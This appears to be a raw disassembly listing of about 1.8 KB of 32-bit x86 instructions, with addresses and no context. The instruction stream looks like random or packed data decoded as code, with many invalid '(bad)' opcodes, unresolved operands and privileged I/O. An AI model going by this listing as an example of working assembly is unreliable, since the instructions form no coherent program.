  44af5b:	dec    esi
  44af5c:	cdq    
  44af5d:	pusha  
  44af5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44af5f:	mov    bl,0xb7
  44af61:	dec    ebp
  44af62:	pushf  
  44af63:	sahf   
  44af64:	ret    
  44af65:	adc    ch,dh
  44af67:	cwde   
  44af68:	stos   DWORD PTR es:[edi],eax
  44af69:	cwde   
  44af6a:	dec    ebx
  44af6b:	test   DWORD PTR [edi],eax
  44af6d:	sbb    esi,DWORD PTR [edi-0x5f]
  44af70:	mov    WORD PTR [esi],ds
  44af72:	scas   al,BYTE PTR es:[edi]
  44af73:	push   0x7a80e4e6
  44af78:	pop    esi
  44af79:	jecxz  0x44af9f
  44af7b:	int    0x9e
  44af7d:	xor    BYTE PTR [eax-0x199ed123],dl
  44af83:	and    bl,bh
  44af85:	out    0x9b,eax
  44af87:	xchg   ebp,eax
  44af88:	shr    DWORD PTR [esi],0xee
  44af8b:	add    ah,BYTE PTR [edx+edx*2]
  44af8e:	int    0xa4
  44af90:	cmp    al,0xc9
  44af92:	lahf   
  44af93:	or     edi,ebp
  44af95:	pusha  
  44af96:	inc    ebx
  44af97:	ret    
  44af98:	mul    BYTE PTR [edx-0x7]
  44af9b:	lods   eax,DWORD PTR ds:[esi]
  44af9c:	test   eax,0x5bcf9ee0
  44afa1:	retf   0xe89d
  44afa4:	(bad)  
  44afa5:	jmp    0x1139:0x8e641e9e
  44afac:	arpl   WORD PTR [edx-0x3c],bx
  44afaf:	sbb    al,0x3
  44afb1:	xor    DWORD PTR [ecx-0x16327220],0xfcbd5ea2
  44afbb:	mov    dh,0x79
  44afbd:	xchg   ebp,eax
  44afbe:	add    ebp,ebp
  44afc0:	lds    esp,FWORD PTR [eax+0x4d]
  44afc3:	mov    cl,0xee
  44afc5:	and    dl,BYTE PTR [edx]
  44afc7:	loop   0x44afc3
  44afc9:	mov    dh,0xef
  44afcb:	inc    edx
  44afcc:	jl     0x44b041
  44afce:	jne    0x44af51
  44afd0:	pushf  
  44afd1:	pushf  
  44afd2:	fwait
  44afd3:	mov    ch,0x58
  44afd5:	popa   
  44afd6:	inc    ebp
  44afd7:	xchg   esi,eax
  44afd8:	pusha  
  44afd9:	sub    BYTE PTR [ebp+0x6b],ch
  44afdc:	and    al,0xdb
  44afde:	out    dx,al
  44afdf:	repz into 
  44afe1:	cs (bad) 
  44afe3:	imul   edx,ecx,0xffffffcf
  44afe6:	mov    dl,0xe8
  44afe8:	dec    edx
  44afe9:	inc    esp
  44afea:	aas    
  44afeb:	enter  0xa40b,0x67
  44afef:	push   ecx
  44aff0:	cs in  eax,dx
  44aff2:	dec    esp
  44aff3:	push   ecx
  44aff4:	xchg   ecx,eax
  44aff6:	repnz inc eax
  44aff8:	arpl   WORD PTR [ebx+0x41],bx
  44affb:	iret   
  44affc:	pop    ebp
  44affd:	popa   
  44affe:	xchg   BYTE PTR [ecx],ch
  44b000:	sbb    bl,ch
  44b002:	or     BYTE PTR [ecx-0x74c70435],ah
  44b008:	mov    dl,0xac
  44b00a:	jge    0x44b06c
  44b00c:	pop    esi
  44b00d:	out    0x59,al
  44b00f:	inc    ebp
  44b010:	push   esi
  44b011:	aam    0x6e
  44b013:	(bad)  
  44b014:	lock pop edi
  44b016:	mov    eax,ds:0x5836b409
  44b01b:	adc    DWORD PTR [edx],edx
  44b01d:	jge    0x44b002
  44b01f:	pop    ecx
  44b020:	pop    esi
  44b021:	xchg   edi,eax
  44b022:	fwait
  44b023:	lock (bad) 
  44b025:	mov    WORD PTR [esi],?
  44b027:	or     ebx,DWORD PTR [ecx-0x2561a1a1]
  44b02d:	repz fstp TBYTE PTR [esi]
  44b030:	sbb    dh,BYTE PTR [ecx-0x1e]
  44b033:	fistp  WORD PTR [ebp-0x5b]
  44b036:	(bad)  
  44b037:	call   0xa94248c7
  44b03c:	out    dx,al
  44b03d:	mov    edx,0xf477939a
  44b042:	sbb    BYTE PTR [ecx-0x3d0eca49],ah
  44b048:	(bad)  
  44b049:	fwait
  44b04a:	add    BYTE PTR [ebx+esi*8+0x32872e5e],ch
  44b051:	dec    edx
  44b052:	retf   
  44b053:	jnp    0x44b01e
  44b055:	lods   al,BYTE PTR ds:[esi]
  44b056:	fisub  DWORD PTR [eax+0x77923747]
  44b05c:	and    eax,DWORD PTR [edi]
  44b05e:	sbb    ecx,DWORD PTR [esi+0x5f]
  44b061:	or     bl,al
  44b063:	outs   dx,DWORD PTR ds:[esi]
  44b064:	adc    ebp,DWORD PTR [eax+0x42610932]
  44b06a:	mov    BYTE PTR [eax-0x5a510a22],ch
  44b070:	inc    ebp
  44b071:	mov    cl,0x28
  44b073:	mov    ebx,0x7b63f5a
  44b078:	out    dx,eax
  44b079:	dec    edx
  44b07a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b07b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b07c:	pop    esi
  44b07d:	mov    al,ds:0x2c5120cd
  44b082:	iret   
  44b083:	mov    al,ds:0x4b9c3113
  44b088:	jg     0x44b032
  44b08a:	jmp    0xdb3b0f59
  44b08f:	xchg   esp,eax
  44b090:	mov    ebp,ecx
  44b092:	or     DWORD PTR ds:0x133800b1,edx
  44b098:	adc    eax,0xfddde75f
  44b09d:	push   esp
  44b09e:	add    eax,0x3240e93b
  44b0a3:	fisttp WORD PTR [ebp+0x7ba0ebb6]
  44b0a9:	cwde   
  44b0aa:	lods   eax,DWORD PTR ds:[esi]
  44b0ab:	aad    0x54
  44b0ad:	inc    eax
  44b0ae:	and    al,0x6b
  44b0b0:	dec    esp
  44b0b1:	or     eax,0xd85f4eed
  44b0b6:	iret   
  44b0b7:	lods   al,BYTE PTR ds:[esi]
  44b0b8:	ret    0xc090
  44b0bb:	pushf  
  44b0bc:	addr16 push 0x235e8b93
  44b0c2:	mov    esi,0x2cc5ccba
  44b0c7:	fstp   DWORD PTR [esi-0x1c]
  44b0ca:	outs   dx,BYTE PTR ds:[esi]
  44b0cb:	jno    0x44b0df
  44b0cd:	mov    edx,0xc13c51b7
  44b0d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44b0d3:	mov    eax,ds:0x4212c459
  44b0d8:	in     al,0x3
  44b0da:	iret   
  44b0db:	ss and eax,ebp
  44b0de:	outs   dx,BYTE PTR ds:[esi]
  44b0df:	adc    BYTE PTR [esi+0x51],0xea
  44b0e3:	mov    al,ds:0xaaca90e3
  44b0e8:	add    edx,ebp
  44b0ea:	bound  ecx,QWORD PTR [ebx]
  44b0ec:	pop    esi
  44b0ed:	cmp    DWORD PTR [esi+0x7c],esp
  44b0f0:	mov    ds:0x4c7a645,al
  44b0f5:	ret    0xc146
  44b0f8:	pop    esi
  44b0f9:	or     al,0x27
  44b0fb:	mov    bl,0x35
  44b0fd:	add    edx,DWORD PTR [ecx]
  44b0ff:	add    eax,0x4b32614b
  44b104:	int    0x52
  44b106:	call   0xd571:0xf0540341
  44b10d:	dec    esp
  44b10e:	xchg   edx,eax
  44b10f:	popa   
  44b110:	and    al,dl
  44b112:	pusha  
  44b113:	lds    ebx,FWORD PTR [ebx+0x7b]
  44b116:	sub    ebx,edi
  44b118:	sub    BYTE PTR [edx-0x3b],al
  44b11b:	pusha  
  44b11c:	sahf   
  44b11d:	mov    edi,ebp
  44b11f:	mov    bh,BYTE PTR [ecx+0x7350eee5]
  44b125:	lea    ecx,[esi+0x134b7fd5]
  44b12b:	jns    0x44b179
  44b12d:	lods   eax,DWORD PTR ds:[esi]
  44b12e:	in     eax,dx
  44b12f:	sub    BYTE PTR [ebp+0x2b7eac5f],bh
  44b135:	ins    DWORD PTR es:[edi],dx
  44b136:	xor    BYTE PTR [eax],ch
  44b138:	lods   eax,DWORD PTR ds:[esi]
  44b139:	mov    ah,0xbb
  44b13b:	mov    ds:0x70444e5e,al
  44b140:	ss in  eax,0xef
  44b143:	ret    0x42c1
  44b146:	pop    ebx
  44b147:	fcom   QWORD PTR [ecx+0x21]
  44b14a:	int    0x2b
  44b14c:	(bad)  
  44b14d:	mul    BYTE PTR [ebp+ebx*8+0x5e]
  44b151:	in     al,0xb7
  44b153:	inc    ebp
  44b154:	dec    eax
  44b155:	icebp  
  44b156:	xchg   esi,eax
  44b157:	and    dl,dl
  44b159:	pusha  
  44b15a:	xchg   ecx,eax
  44b15b:	pop    ebp
  44b15c:	jl     0x44b18c
  44b15e:	inc    ebx
  44b15f:	aad    0x2e
  44b161:	imul   ebp,esi,0xd90fe0d5
  44b167:	nop
  44b168:	mov    edx,0xf98db000
  44b16d:	jbe    0x44b157
  44b16f:	pusha  
  44b170:	push   0xe
  44b172:	lods   eax,DWORD PTR ds:[esi]
  44b173:	xor    DWORD PTR [ebx+0x47],0xffffffee
  44b177:	jp     0x44b16e
  44b179:	cmp    al,0xc8
  44b17b:	sbb    DWORD PTR [ecx+0x11a12311],esp
  44b181:	fiadd  DWORD PTR [esi]
  44b183:	mov    al,ss:0x5b20b13e
  44b189:	push   es
  44b18a:	outs   dx,DWORD PTR ds:[esi]
  44b18b:	je     0x44b14f
  44b18d:	retf   
  44b18e:	scas   al,BYTE PTR es:[edi]
  44b18f:	cmc    
  44b190:	sbb    BYTE PTR ds:0x60dd790f,ah
  44b196:	pause  
  44b198:	pop    ecx
  44b199:	sub    dh,BYTE PTR [edx*8-0x79a3f846]
  44b1a0:	pop    esi
  44b1a1:	outs   dx,DWORD PTR ds:[esi]
  44b1a2:	outs   dx,BYTE PTR ds:[esi]
  44b1a3:	mov    cl,0xbe
  44b1a5:	les    eax,FWORD PTR [ebx+0x37615c20]
  44b1ab:	arpl   WORD PTR [esi+0xc],ax
  44b1ae:	mov    al,0xdc
  44b1b0:	int    0x2
  44b1b2:	dec    edx
  44b1b3:	cmp    al,0x5e
  44b1b5:	daa    
  44b1b6:	out    dx,eax
  44b1b7:	ret    
  44b1b8:	cmp    al,0xa6
  44b1ba:	shl    BYTE PTR [esi],cl
  44b1bc:	dec    ecx
  44b1bd:	popa   
  44b1be:	and    ebp,DWORD PTR [eax-0x6e]
  44b1c1:	pop    eax
  44b1c2:	int3   
  44b1c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b1c4:	push   ecx
  44b1c5:	cs in  al,dx
  44b1c7:	ss test al,0x57
  44b1ca:	xlat   BYTE PTR ds:[ebx]
  44b1cb:	fsubr  QWORD PTR [ebx]
  44b1cd:	rcl    DWORD PTR [eax],0x8a
  44b1d0:	inc    edi
  44b1d1:	push   0xf9de7f8f
  44b1d6:	push   0xffffff9c
  44b1d8:	dec    edx
  44b1d9:	test   al,0xd2
  44b1db:	pushf  
  44b1dc:	xor    bh,BYTE PTR [ebx+ecx*2]
  44b1df:	sub    BYTE PTR [esi-0x453ced1d],bl
  44b1e5:	sub    ch,BYTE PTR [esi]
  44b1e7:	imul   edx,DWORD PTR [eax+0x4a],0x6158f8a3
  44b1ee:	push   edi
  44b1ef:	dec    esp
  44b1f0:	cmp    BYTE PTR [edi-0x210e3a3f],cl
  44b1f6:	or     ch,dl
  44b1f8:	rcr    ah,1
  44b1fa:	jmp    0x44b208
  44b1fc:	stos   DWORD PTR es:[edi],eax
  44b1fd:	dec    eax
  44b1fe:	xor    ebp,DWORD PTR [ecx-0x23]
  44b201:	jecxz  0x44b19c
  44b203:	test   al,0x2b
  44b205:	retf   
  44b206:	push   esi
  44b207:	test   al,0xbf
  44b209:	loopne 0x44b199
  44b20b:	mov    ebp,0x92edee8e
  44b210:	push   0x786f8dee
  44b215:	add    eax,0xb2b18a3a
  44b21a:	push   cs
  44b21b:	lea    ebp,[edx-0x41]
  44b21e:	in     eax,0xe0
  44b220:	hlt    
  44b221:	add    DWORD PTR ds:[edx],esi
  44b224:	xchg   esp,eax
  44b226:	in     eax,dx
  44b227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44b228:	nop
  44b229:	scas   eax,DWORD PTR es:[edi]
  44b22a:	mov    al,ds:0x461445e5
  44b22f:	pop    esp
  44b230:	out    dx,eax
  44b231:	pusha  
  44b232:	adc    edx,esp
  44b234:	mov    al,0x99
  44b236:	fwait
  44b237:	int    0x81
  44b239:	push   esp
  44b23a:	out    dx,al
  44b23b:	jmpw   0x5976
  44b23f:	fwait
  44b240:	push   eax
  44b241:	mov    cl,0x76
  44b243:	test   al,0xa
  44b245:	xor    BYTE PTR [esi-0x4f7f5648],dh
  44b24b:	mov    ch,BYTE PTR [edi+0x1e]
  44b24e:	out    dx,al
  44b24f:	cmp    al,0x2e
  44b251:	out    0xf4,eax
  44b253:	(bad)
  44b256:	shr    BYTE PTR [esp+esi*8+0x3e86e88],0xcf
  44b25e:	push   ebp
  44b25f:	daa    
  44b260:	pop    ss
  44b261:	and    WORD PTR [eax-0x349aa257],sp
  44b268:	rcr    DWORD PTR [esi+0x0],0x81
  44b26c:	bound  edi,QWORD PTR [eax]
  44b26e:	dec    ecx
  44b26f:	mov    eax,ds:0x5726dfc5
  44b274:	and    DWORD PTR [esi+eax*8-0x2dc9a1f2],eax
  44b27b:	sub    eax,0x5d6485ae
  44b280:	(bad)  
  44b281:	pusha  
  44b282:	pop    ss
  44b283:	xchg   edx,eax
  44b284:	cmp    eax,0x212f5354
  44b289:	test   esi,ebp
  44b28b:	ss mov al,0x78
  44b28e:	and    BYTE PTR ds:0x9f401d9e,cl
  44b294:	jb     0x44b21f
  44b296:	enter  0xfef2,0x80
  44b29a:	imul   ebp,edx,0xf4ee8d35
  44b2a0:	push   esp
  44b2a1:	xchg   ecx,eax
  44b2a2:	sar    DWORD PTR [esi-0x74],0xd4
  44b2a6:	dec    eax
  44b2a7:	test   al,0x76
  44b2a9:	xchg   edx,eax
  44b2aa:	es jne 0x44b288
  44b2ad:	and    BYTE PTR [ecx+0x7b],bl
  44b2b0:	daa    
  44b2b1:	push   cs
  44b2b2:	out    dx,al
  44b2b3:	dec    bx
  44b2b5:	(bad)  
  44b2b6:	loop   0x44b308
  44b2b8:	dec    edx
  44b2b9:	or     DWORD PTR ds:0xfc810ba1,esi
  44b2bf:	mov    ebp,esi
  44b2c1:	and    DWORD PTR [ecx],eax
  44b2c3:	inc    ebp
  44b2c4:	pop    esi
  44b2c5:	jmp    0x44b247
  44b2c7:	or     edx,DWORD PTR [esi-0x4d7628c4]
  44b2cd:	pusha  
  44b2ce:	sub    eax,0x7c8f0b04
  44b2d3:	and    dl,BYTE PTR [ecx+0x519750e6]
  44b2d9:	in     al,0x6c
  44b2db:	in     al,dx
  44b2dc:	fisub  WORD PTR [ebp-0x51]
  44b2df:	xor    eax,DWORD PTR [edx-0x48]
  44b2e2:	mov    bh,0xa5
  44b2e4:	test   BYTE PTR [edx-0x5fc2faf7],dl
  44b2ea:	add    BYTE PTR [edi+0x59],0x91
  44b2ee:	sbb    eax,0xdcbe5ac4
  44b2f3:	add    esp,DWORD PTR [edx-0x2d0dd21a]
  44b2f9:	dec    ebx
  44b2fa:	sub    bl,dl
  44b2fc:	(bad)  
  44b2fd:	fs mov al,0x86
  44b300:	push   edx
  44b301:	daa    
  44b302:	and    ah,BYTE PTR [ecx]
  44b304:	cmp    BYTE PTR [ebx],dh
  44b306:	sub    BYTE PTR [esp+ebx*1],ch
  44b309:	inc    edx
  44b30a:	out    dx,al
  44b30b:	pop    esi
  44b30c:	mul    dh
  44b30e:	xchg   ebx,eax
  44b30f:	cmp    DWORD PTR [ebp+esi*4+0x3d],eax
  44b313:	mov    eax,ds:0x3990dd8
  44b318:	repnz sub al,0x3e
  44b31b:	mov    bl,0x5e
  44b31d:	push   ebp
  44b31e:	popf   
  44b31f:	xor    DWORD PTR [eax-0xc],esi
  44b322:	hlt    
  44b323:	mov    ds:0x36e560b6,al
  44b328:	loopne 0x44b39a
  44b32a:	and    DWORD PTR cs:[ecx+0x51],edi
  44b32e:	out    0xcb,eax
  44b330:	or     al,0x79
  44b332:	mov    ds:0xe35b1e8a,eax
  44b337:	mov    esi,0x61ce60d4
  44b33c:	pop    edx
  44b33d:	jbe    0x44b2fc
  44b33f:	dec    ebx
  44b340:	xor    DWORD PTR [edx-0x12],ebx
  44b343:	fwait
  44b344:	imul   esp,esi,0x8470417f
  44b34a:	mov    ch,0xa1
  44b34c:	or     BYTE PTR [edx+ebx*8],dh
  44b34f:	(bad)  
  44b350:	cwde   
  44b351:	test   BYTE PTR [ebx-0xf34c37b],0x51
  44b358:	cmp    edx,ebp
  44b35a:	jle    0x44b3a0
  44b35c:	add    bl,ah
  44b35e:	xchg   edx,eax
  44b35f:	add    DWORD PTR [ebp-0x2c601e7f],0xdf8e7491
  44b369:	mov    ch,0x21
  44b36b:	and    BYTE PTR [esi+0x5d0066a2],ch
  44b371:	ins    BYTE PTR es:[edi],dx
  44b372:	ins    BYTE PTR es:[edi],dx
  44b373:	rol    DWORD PTR [edx],0x1c
  44b376:	(bad)  
  44b378:	mov    ds:0x25a10471,al
  44b37d:	mov    ebp,0x5e23eb29
  44b382:	cmp    al,0x89
  44b384:	push   esp
  44b385:	stos   BYTE PTR es:[edi],al
  44b386:	mov    eax,ds:0xde3de0fe
  44b38b:	pop    esp
  44b38c:	xor    al,0xda
  44b38e:	pop    ebp
  44b38f:	int3   
  44b390:	scas   al,BYTE PTR es:[edi]
  44b391:	fild   WORD PTR [edi-0x6da06457]
  44b397:	and    BYTE PTR [edi+0x19],0x83
  44b39b:	imul   esp,edx,0x5ff720a8
  44b3a1:	icebp  
  44b3a2:	sbb    ch,BYTE PTR [edx+0x68d2c13b]
  44b3a8:	mov    bl,0x5
  44b3aa:	push   ebx
  44b3ab:	mov    eax,ds:0xe0d61a7c
  44b3b0:	out    0x8c,eax
  44b3b2:	jmp    0x44b3ab
  44b3b4:	js     0x44b3a0
  44b3b6:	pusha  
  44b3b7:	xchg   esi,eax
  44b3b8:	pop    esi
  44b3b9:	or     BYTE PTR [edx-0x47f00826],bh
  44b3bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b3c0:	shl    DWORD PTR [eax+0x7c],cl
  44b3c3:	ins    BYTE PTR es:[edi],dx
  44b3c4:	mov    cl,BYTE PTR [ebx]
  44b3c6:	fbld   TBYTE PTR [esi-0x2012f8fc]
  44b3cc:	push   edx
  44b3cd:	fcomp  QWORD PTR [edi-0x31d20323]
  44b3d3:	loopne 0x44b38c
  44b3d5:	pusha  
  44b3d6:	xor    al,0x42
  44b3d8:	inc    esp
  44b3d9:	cmp    ch,ch
  44b3db:	pop    DWORD PTR [edi]
  44b3dd:	dec    edx
  44b3de:	out    dx,al
  44b3df:	or     al,bl
  44b3e1:	iret   
  44b3e2:	sub    ebp,DWORD PTR [esi+ecx*2+0x3c]
  44b3e6:	fisub  WORD PTR [eax+0x3a2d1805]
  44b3ec:	jae    0x44b445
  44b3ee:	cmp    eax,0xb92d5bd8
  44b3f3:	(bad)  
  44b3f4:	fnstcw WORD PTR [ebx+0x7c3eb77e]
  44b3fa:	mov    esp,DWORD PTR [ecx-0x5c9b4c1b]
  44b400:	daa    
  44b401:	cwde   
  44b402:	mov    dl,0xea
  44b404:	pop    esi
  44b405:	jp     0x44b3cb
  44b407:	add    eax,0xbf08baa4
  44b40c:	fnsave [eax+0x3b4ba04b]
  44b412:	mov    bl,0x4b
  44b414:	and    ebp,DWORD PTR [esi+ecx*8+0x3c]
  44b418:	mov    cl,0xc
  44b41a:	pop    ss
  44b41b:	sub    bl,BYTE PTR [esi+0x71]
  44b41e:	dec    edi
  44b41f:	pop    ss
  44b420:	cmp    eax,0xf0aa61dc
  44b425:	pusha  
  44b426:	lea    ebx,[ecx-0x211de905]
  44b42c:	dec    esp
  44b42d:	pop    es
  44b42e:	out    dx,al
  44b42f:	pop    esi
  44b430:	loope  0x44b3cd
  44b432:	fdivr  DWORD PTR [esi]
  44b434:	or     DWORD PTR [esi+0x55],edx
  44b437:	mov    eax,ds:0xb9283e9
  44b43c:	jge    0x44b3e6
  44b43e:	jmp    0x44b4a4
  44b440:	pop    esi
  44b441:	aas    
  44b442:	scas   eax,DWORD PTR es:[edi]
  44b443:	mov    ?,WORD PTR [eax-0x20dea]
  44b449:	pusha  
  44b44a:	pop    esp
  44b44b:	xchg   edx,eax
  44b44c:	loop   0x44b47a
  44b44e:	addr16 pop esp
  44b450:	pop    ss
  44b451:	enter  0xfaee,0xbd
  44b455:	pushf  
  44b456:	scas   eax,DWORD PTR es:[edi]
  44b457:	and    BYTE PTR [ecx+edx*2-0x34],ah
  44b45b:	mov    al,ds:0x4b262d96
  44b460:	adc    edi,ebp
  44b462:	xchg   ebx,eax
  44b463:	rol    BYTE PTR [edx+0x3e],cl
  44b466:	cs dec edx
  44b468:	pop    esi
  44b469:	cmp    eax,DWORD PTR [edx+0x4f6bde1b]
  44b46f:	mov    eax,ds:0x9fd49e05
  44b474:	push   es
  44b475:	jmp    0x1a55:0x745e4589
  44b47c:	cmp    DWORD PTR [ecx],eax
  44b47e:	(bad)
  44b481:	pusha  
  44b482:	icebp  
  44b483:	jae    0x44b4ea
  44b485:	lock bound edx,QWORD PTR [edi+0x52017988]
  44b48c:	inc    eax
  44b48d:	imul   esp,DWORD PTR cs:[bx-0x6c],0x1e
  44b493:	push   ebp
  44b494:	(bad)  
  44b495:	push   0xffffffe4
  44b497:	mov    al,ds:0x7e0f3084
  44b49c:	adc    eax,0x64b811c6
  44b4a1:	push   es
  44b4a2:	push   ss
  44b4a3:	add    DWORD PTR [ebx+0x21892ec3],ecx
  44b4a9:	adc    cl,BYTE PTR [esi+0x5960c1f5]
  44b4af:	inc    ebx
  44b4b0:	ds push ds
  44b4b2:	ror    BYTE PTR [ebx],cl
  44b4b4:	lds    ebx,FWORD PTR [ebx]
  44b4b6:	out    dx,al
  44b4b7:	push   ebp
  44b4b8:	push   0x33
  44b4ba:	in     eax,0xb3
  44b4bc:	call   0x29e72e01
  44b4c1:	(bad)  
  44b4c2:	iret   
  44b4c3:	xchg   esi,eax
  44b4c4:	out    0xbe,al
  44b4c6:	xlat   BYTE PTR ds:[ebx]
  44b4c7:	pop    eax
  44b4c8:	xor    dl,BYTE PTR [ebp-0xec3027a]
  44b4ce:	mul    dl
  44b4d0:	arpl   WORD PTR [edi],bp
  44b4d2:	rcr    BYTE PTR [edi-0xd],0xe0
  44b4d6:	pop    eax
  44b4d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44b4d8:	stos   DWORD PTR es:[edi],eax
  44b4d9:	inc    ebx
  44b4da:	add    BYTE PTR [eax-0x1812bac8],ah
  44b4e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b4e2:	mov    bh,0xba
  44b4e4:	popf   
  44b4e5:	out    0xee,eax
  44b4e7:	push   cs
  44b4e8:	lds    edi,FWORD PTR ds:0xd3d29f30
  44b4ee:	sahf   
  44b4ef:	mov    eax,ds:0xe891c7ec
  44b4f4:	lods   eax,DWORD PTR ds:[esi]
  44b4f5:	jno    0x44b563
  44b4f7:	xchg   edx,eax
  44b4f8:	pop    ebx
  44b4f9:	sub    eax,0x9b10999a
  44b4fe:	cs push esi
  44b500:	xor    eax,0x9a467ff
  44b505:	push   ecx
  44b506:	jbe    0x44b509
  44b508:	pop    edx
  44b509:	mov    esi,0x230ab02e
  44b50e:	add    BYTE PTR [eax+0x65],bh
  44b511:	scas   al,BYTE PTR es:[edi]
  44b512:	out    dx,al
  44b513:	push   cs
  44b514:	mov    edi,0x26aba4dd
  44b519:	push   ebx
  44b51a:	add    al,0x68
  44b51c:	mov    al,ds:0xdd42abd3
  44b521:	adc    ah,BYTE PTR [ebx+0x4]
  44b524:	(bad)  
  44b525:	test   al,0xd8
  44b527:	fistp  DWORD PTR [esi-0x26]
  44b52a:	popa   
  44b52b:	xchg   edi,eax
  44b52c:	pop    ds
  44b52d:	mov    WORD PTR [ebx-0x27],fs
  44b530:	and    eax,0xcbfd3045
  44b535:	mov    al,ds:0x1144016c
  44b53a:	lods   al,BYTE PTR ds:[esi]
  44b53b:	popa   
  44b53c:	in     eax,dx
  44b53d:	xchg   ecx,eax
  44b53e:	out    dx,al
  44b53f:	and    eax,0xd2062992
  44b544:	push   ds
  44b545:	inc    bx
  44b547:	mov    eax,ds:0xbb7069ea
  44b54c:	test   BYTE PTR [eax-0x54a1099c],al
  44b552:	test   BYTE PTR [edx],bh
  44b554:	mov    WORD PTR [ebx-0x3d],ds
  44b557:	js     0x44b57d
  44b559:	popa   
  44b55a:	popf   
  44b55b:	sbb    dl,BYTE PTR [edx+0x79846361]
  44b561:	leave  
  44b562:	dec    eax
  44b563:	out    dx,eax
  44b564:	jl     0x44b519
  44b566:	out    dx,al
  44b567:	inc    edi
  44b568:	inc    edi
  44b569:	cmp    DWORD PTR [ecx],esp
  44b56b:	dec    edi
  44b56c:	shr    BYTE PTR [edx+0x5f],0x8d
  44b570:	push   ebx
  44b571:	xchg   esp,eax
  44b572:	dec    edx
  44b573:	and    esp,edi
  44b575:	xchg   esp,eax
  44b576:	or     DWORD PTR [ecx+0xc],edx
  44b579:	ret    0xc6ff
  44b57c:	test   al,0x3d
  44b57e:	out    dx,al
  44b57f:	pop    ss
  44b580:	and    BYTE PTR [eax+0x60676223],0x1e
  44b587:	jae    0x44b607
  44b589:	xchg   DWORD PTR [edi+0x23],ecx
  44b58c:	rcr    BYTE PTR [eax+0x3b2bdf50],cl
  44b592:	push   0xc7818e91
  44b597:	enter  0x3035,0x4a
  44b59b:	mov    ds:0x13d3b5fa,al
  44b5a0:	jbe    0x44b5e4
  44b5a2:	adc    esi,DWORD PTR [ecx+0x75]
  44b5a5:	(bad)  
  44b5a6:	out    dx,al
  44b5a7:	sbb    BYTE PTR [edx],ch
  44b5a9:	mov    cs,WORD PTR [eax]
  44b5ab:	call   0xa11350fb
  44b5b0:	cmp    BYTE PTR [ebp+0x30],dh
  44b5b3:	sub    eax,0xffd27e98
  44b5b8:	pop    esi
  44b5b9:	shl    DWORD PTR [eax-0x6505ecb0],cl
  44b5bf:	lahf   
  44b5c0:	aaa    
  44b5c1:	popa   
  44b5c2:	das    
  44b5c3:	dec    ecx
  44b5c4:	stc    
  44b5c5:	neg    DWORD PTR [esi]
  44b5c7:	xchg   edi,eax
  44b5c8:	repz ss out dx,eax
  44b5cb:	mov    ds:0xcda8bd00,al
  44b5d0:	idiv   DWORD PTR [esi+eax*1-0x70]
  44b5d4:	cmp    ah,BYTE PTR [edx]
  44b5d6:	in     al,dx
  44b5d7:	iret   
  44b5d8:	jno    0x44b584
  44b5da:	into   
  44b5db:	add    BYTE PTR [eax],dh
  44b5dd:	xchg   edi,eax
  44b5de:	frstor [ecx-0x80]
  44b5e1:	jle    0x44b5c3
  44b5e3:	mov    ds:0xcb68cbe,al
  44b5e8:	arpl   bx,dx
  44b5ea:	mov    ecx,DWORD PTR [edx+eax*4-0x4bd551bd]
  44b5f1:	lds    esi,FWORD PTR [edx]
  44b5f3:	jl     0x44b644
  44b5f5:	pop    edi
  44b5f6:	sbb    edx,edx
  44b5f8:	jmp    0x44b64f
  44b5fa:	fadd   QWORD PTR [edx-0x62]
  44b5fd:	sbb    BYTE PTR [eax-0x13078907],bl
  44b603:	and    ah,BYTE PTR [esi-0x67acc834]
  44b609:	mov    al,ds:0x60e1fb66
  44b60e:	push   eax
  44b60f:	fiadd  WORD PTR ds:0x1e240069
  44b615:	push   ecx
  44b616:	out    dx,al
  44b617:	aaa    
  44b618:	fdiv   st(2),st
  44b61a:	leave  
  44b61b:	dec    eax
  44b61c:	clc    
  44b61d:	push   ds
  44b61e:	xchg   ecx,eax
  44b61f:	mov    ?,WORD PTR [eax]
  44b621:	ret    0xa394
  44b624:	mov    db0,esp
  44b627:	or     eax,0x39e58fde
  44b62c:	push   esi
  44b62d:	leave  
  44b62e:	out    dx,al
  44b62f:	push   0xf6e61b7e
  44b634:	in     eax,0xd4
  44b636:	retf   0x10a7
  44b639:	gs mov bl,0xc9
  44b63c:	loopne 0x44b5ce
  44b63e:	sahf   
  44b63f:	jge    0x44b5f4
  44b641:	mov    ds:0x5d09ee,al
  44b646:	push   ss
  44b647:	(bad)  
  44b648:	xor    BYTE PTR [ecx+esi*1-0x60],bh
  44b64c:	loope  0x44b6bd
  44b64e:	pop    ds
  44b64f:	in     eax,dx
  44b650:	and    al,0x69
  44b652:	inc    edi
  44b653:	jae    0x44b5e6
  44b655:	test   eax,0x5aa9115b
  44b65a:	adc    DWORD PTR [esi+0x4547f95e],ecx
  44b660:	cmp    BYTE PTR [ecx],cl
  44b662:	mov    ds:0x2743ad6f,eax
  44b667:	jge    0x44b63b
  44b669:	pusha  
  44b66a:	dec    edx
  44b66b:	or     bh,BYTE PTR [edi-0x5d]
  44b66e:	jae    0x44b6eb
  44b670:	add    DWORD PTR [si],edi
  44b673:	shr    BYTE PTR [esi-0x20],cl
  44b676:	adc    eax,DWORD PTR [edx-0x3c]
  44b679:	popf   
  44b67a:	sub    ah,BYTE PTR [ecx+0x3a882124]
  44b680:	stc    
  44b681:	pop    ebx
  44b682:	outs   dx,BYTE PTR ds:[esi]
  44b683:	in     eax,dx
  44b684:	pop    esi
  44b685:	jle    0x44b6d7
  44b687:	jne    0x44b6a8
  44b689:	test   eax,0x6122d07e
  44b68e:	fucom  st(4)
  44b690:	mov    ?,WORD PTR [esi+ebx*2]
  44b693:	cwde   
  44b694:	mov    ch,0xc4
  44b696:	out    0x8c,eax
  44b698:	sbb    al,0x43
  44b69a:	add    al,0x88
  44b69c:	xor    BYTE PTR [ebp+0x755200e5],al
  44b6a2:	xlat   BYTE PTR ds:[ebx]
  44b6a3:	mov    ds:0x7fbbee48,eax
  44b6a8:	fsub   DWORD PTR ds:0xc4d37c86
  44b6ae:	out    dx,eax
  44b6af:	inc    ebp
